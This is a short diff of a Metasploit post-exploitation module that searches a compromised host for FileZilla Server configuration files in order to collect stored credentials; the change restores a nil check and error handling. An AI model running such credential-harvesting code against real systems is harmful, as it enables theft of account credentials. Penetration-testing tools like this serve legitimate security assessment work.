@@ -50,9 +50,9 @@ class Metasploit3 < Msf::Post
 		end
 
 		filezilla = check_filezilla
-		#if filezilla != nil
+		if filezilla != nil
 			get_filezilla_creds(filezilla)
-		#end
+		end
 	end
 
 	def check_filezilla
@@ -61,12 +61,12 @@ class Metasploit3 < Msf::Post
 
 		print_status("Checking for Filezilla Server directory in: #{path}")
 
-		#begin
-		#	session.fs.dir.entries(path)
-		#rescue ::Exception => e
-		#	print_error(e.to_s)
-		#	return
-		#end
+		begin
+			session.fs.dir.entries(path)
+		rescue ::Exception => e
+			print_error(e.to_s)
+			return
+		end
 
 		session.fs.dir.foreach(path) do |fdir|
 			if fdir =~ /FileZilla\sServer.*\.xml/i
